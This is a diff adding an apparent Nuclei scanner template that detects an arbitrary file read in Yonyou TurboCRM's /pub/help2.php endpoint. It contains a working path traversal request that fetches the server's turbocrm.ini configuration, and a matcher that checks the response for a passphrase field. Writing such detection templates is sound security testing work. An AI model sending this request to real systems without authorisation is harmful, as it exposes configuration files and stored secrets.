@@ -1,0 +1,17 @@
+id: yonyou-turbo-crm-help2-fileread
+
+info:
+  name: 用友 TurboCRM /pub/help2.php 接口任意文件读取
+  author: SleepingBag945
+  severity: high
+
+http:
+  - raw:
+      - |
+        GET /pub/help2.php?key=/../../tsvr/turbocrm.ini HTTP/1.1
+        Host: {{Hostname}}
+
+    matchers:
+      - type: dsl
+        dsl:
+          - status_code==200 && contains(body,"IOSPushPassphrase")
